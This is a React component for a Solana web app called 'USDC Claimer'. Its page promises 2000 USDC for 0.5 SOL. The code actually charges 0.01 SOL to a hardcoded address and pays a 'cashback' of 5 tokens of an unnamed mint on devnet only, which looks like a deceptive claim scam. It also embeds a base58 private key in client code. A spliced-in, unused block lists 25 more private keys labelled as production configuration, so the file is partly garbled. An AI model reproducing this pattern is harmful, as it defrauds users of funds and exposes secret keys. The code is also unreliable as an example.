/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "ZBzFzoatVphCyV5pNc88aP3JjoQEH5XdyYNKF3GWm5JLCz4Wr2GtSMdoceiAN8zZSJECQhGzrzNaa9iUAtcR28j"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4hHMXZ6s9yxs2xZ22qbEaKunfUWgKxN2SQLmwC1AAxhFFu6juY9bygwDLLLGV9qRpDsmM75CieBVxYTLAtMdR43U",
  "key1": "4vsMADhzMg3PamrfcCdnuYLk5wKKSt4XmrVeW2SBJHvhkxbwvY22Hza83kaEQTjrzW3wp1dmqGNPzx2jamJySn7N",
  "key2": "5R4pDngwa7tc8ULhpiagH9G2EMRuZcPij14RDBaMvfg2zoFLZnNyqirHjZBNHnLAgL69wb5jsG4w5GhBb8RznPb8",
  "key3": "22iX8jHoyYh1RjMJSvJ3yNTYGMaszLBZYwYcPk8nPoDVBgw97e1WFFz8UnLTZfHZupSUWbQ1P592wY4KtiktE3HA",
  "key4": "4EDbcDcbZcAK6xdq1Ni6NbFJaNyKvsKx69FVXw62FMT5YQLdg7K49SBoPyXX2VdnW9SEeh5zG55twoF88UoNeNZA",
  "key5": "4xhn3aVpLYXrBZRdtbhtjRsxLX2CHdE5Vfiaqm4zNhGqLRCjDrdAnvsdohbxH2dbJkRxPMQ3ze1v8Rg3YSF4NQ2d",
  "key6": "3ZCZCAcu7TcR8kcczzBz6mjfVkjbzbkGBayx7hfyFtCMzsBFt2TMNsRcwyco3DPNM4xqP9mCQ1sspQbA3WCxcKab",
  "key7": "2hiqYGHPtw1XXSJD33FbGnSV23F5wPn8VH58AgvYCAW1yz8FGDH2gZEm9DtjnTDHYbZbxgrvoX71JEYKiAB3FRQM",
  "key8": "eps3gJVjs4JM1cJaoNykUyJXnskZ58WP4MNeMyNjfANE1UvJLm8XZDuRfjMdtChV4VF63rkujVhB5YdjrTTzBLs",
  "key9": "zPCdFfBGhbNTvXMuBHs1hRTXqnhf4D1BdxmrdXdAuomrv5hEZDPGKuGpdEdg4YyXMHDop6RZFG8yEqFAqSnhkPq",
  "key10": "C1umhUbyjnwmnUDuq72my3ZLNgANj6ZndVgp3V9eQqCzB9k7VKQY5aF4dwPdwy5nFzpz3jMabf11TWDfu4mFiZx",
  "key11": "3CQYNUbCBarTx2osdS4Jtee8uy8pkYCHM87UeTCsUhnEtvbPNzbWr6ukBhUKfgLYUXfWxRsQWRbYmA3QeArn2pA3",
  "key12": "zdN1rnDsyBU5k5NFetNq8LMRyUyqkJFxZagG98XpsGYHpmftsQY9CdSag91qd2gXPEzr48FCSMtiCQJZrDAb1Rd",
  "key13": "LYRrTyEckXRB3cMt9aB3gz2LGVxekA4DL31K9sTBBJR6GodTSpdLzeQX4w1sdVo9LrpezJRzARPxGQsttrg5oHh",
  "key14": "35hK1zAwrVHcNzq4XQ8HLtmWpQHBs47dGBv3PeAxhpGxrhjhbKq9deekmD1tYGdzVPuohoV6XkeBEoNfhBwv3eie",
  "key15": "5RYJTiYEf7LTrZKyKdJH1p3gwoz5cGucpstmDdyW5AycV8vfWQ25xGnrgRqTm8PUdDf2rBB28kN8EpnFdeHVvBjN",
  "key16": "4dyKkkWwdjaPuPS1Utqb7MTDAZVHXBkMnkQsANVyzeaq2apeEjYa3grfykN4E9b3h6fRQA5PojFnYMTAkJfdLfNC",
  "key17": "2sHgeb7cNp5hun1RNFSsBV8MNXfJUx961KRJPfbBKnrBiJTHHx7W6JMHzAwt5v6PLRjM7RtN2J8xMqRc8zK4Ckzt",
  "key18": "38hezMtRoqFCtgz7f3F6wV5DR19tnx8jQWzYsMEM2wkMDgNzpDeXSTcJFAwFPbhAdst2oyJaEZxuTK3GeLFNnaWG",
  "key19": "3z6CM7Vk8bj9SY34u9HE9PrJ8VeJWY4JKcoYPQYK13UAxdwH6bZsUiAXSkhTutZdX8aw2yAAbn5vzAEfAR4BGG1k",
  "key20": "2tM6fEacG7voWfMVBFuY2ULSyTc9SC5M2d6hT7o5ZG9gb7sUjL8uh1g1x6CdYpB3vGjVrUJeHSK431ZdU1evGtV5",
  "key21": "4kewWHAaU3U8krprWYMa1kriVptDXaCdgYBAk3Tr1pxqgVwGtC7p7VakLUTT6A1QANzoVmtMAbUkigG6sH4mvhCu",
  "key22": "5CGeeAcWanndEVq8LhVNswd3bDBx6V12ypkX4dHAx3VAanuAdnGVFhnbAKNmmmrkUFXNXPGSgeT9vT424pZEdH17",
  "key23": "5Byi1fC9dJEQE7SFMZWQURc1379KwAoQBiQnPgwcxdZAafTCVw8S397HNNCf3tXk1CYDgraUwPCpc3josxaSFc25",
  "key24": "4mzDLfUthpu6a2cwx2W2riL7cAiFisEeCwTMa7smoZECvX2A2HwGCwXQyLqGHBG7DZFUyrPxKU8Wy6XAaNFpYqTQ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
